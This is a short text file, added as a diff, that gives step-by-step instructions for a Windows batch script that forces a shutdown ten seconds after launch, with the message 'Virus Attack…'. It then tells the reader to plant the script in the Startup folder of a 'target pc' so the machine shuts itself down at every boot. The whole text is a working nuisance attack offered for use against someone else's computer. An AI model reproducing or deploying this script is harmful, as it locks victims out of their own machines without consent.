@@ -1,0 +1,25 @@
+every boot shutdown
+
+in notepad type :
+
+
+          @ECHO OFF
+
+          shutdown -s -t 10 -c “Virus Attack…”
+
+          exit
+          
+          
+save it as <whatever u want>.bat
+
+
+
+for everyboot start u shoukd access the target pc and save it in Startups::
+follow these steps
+
+1. Start --> All Programs
+2. Right Click on Startup --> Open
+3. Paste the <whatever u want>.bat here.
+
+
+just it ;D
